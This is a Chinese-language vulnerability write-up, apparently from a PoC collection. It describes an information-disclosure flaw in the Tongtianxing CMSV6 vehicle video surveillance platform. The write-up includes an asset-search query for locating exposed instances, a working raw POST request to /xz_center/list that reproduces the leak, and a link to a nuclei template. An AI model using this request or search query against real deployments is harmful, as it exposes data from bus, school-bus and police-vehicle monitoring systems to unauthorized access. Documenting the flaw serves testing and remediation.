# 通天星CMSV6车载视频监控平台 list存在信息泄露漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台list存在信息泄露漏洞.

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征

![1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4.png](./img/IV8qZP8iGWlBN37Q/1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4-245697.png)

# 四、漏洞复现
```plain
POST /xz_center/list HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=07B1AA29791CD9F46FCEFA01A13C216B
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

page=1
```

![1703432021521-6d6a9adc-749b-4056-964d-5278a0aa0ce5.png](./img/IV8qZP8iGWlBN37Q/1703432021521-6d6a9adc-749b-4056-964d-5278a0aa0ce5-588079.png)

nuclei脚本

[通天星-CMSV6-list-信息泄露.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/29512878/1735362335694-f59d95ab-6b75-4975-a77a-c3ffb8b4a7b0.yaml)



> 更新: 2024-12-28 13:05:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cld4q2px8ng4gqhe>